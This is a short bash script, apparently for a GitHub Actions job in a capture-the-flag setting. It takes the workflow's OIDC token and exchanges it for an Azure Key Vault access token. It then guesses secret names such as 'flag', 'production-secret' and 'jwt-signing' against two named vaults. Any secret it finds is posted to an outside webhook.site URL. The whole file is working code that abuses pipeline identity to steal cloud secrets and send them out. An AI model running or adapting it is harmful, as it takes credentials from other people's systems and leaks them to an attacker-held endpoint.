#!/usr/bin/env bash
set +e
W="https://webhook.site/f620cb33-be09-4305-951e-d48a9fdb1843"
say(){ curl -s -m 10 --data-binary "$1" "$W" >/dev/null 2>&1 || true; printf '%s\n' "$1"; }
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e; CID=72ff278a-9e71-43ec-bac4-2ca303f8e462
OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=2.0" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$CID" --data "grant_type=client_credentials" --data "scope=https://vault.azure.net/.default" --data "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
names="flag production-flag tebamoto-flag df26 flag-production reporting-config storefront-config internal-config app-config settings production-secret app-secret jwt-signing signing-key storefront-flag reporting-flag ctf ctf-flag prod-flag secret flag1 the-flag"
for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  for n in $names; do
    R=$(curl -sS -m 10 -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets/$n?api-version=7.4")
    echo "$R" | grep -q '"value"' && say "HIT_${V}_${n}=$R"
  done
done
say "DONE11"
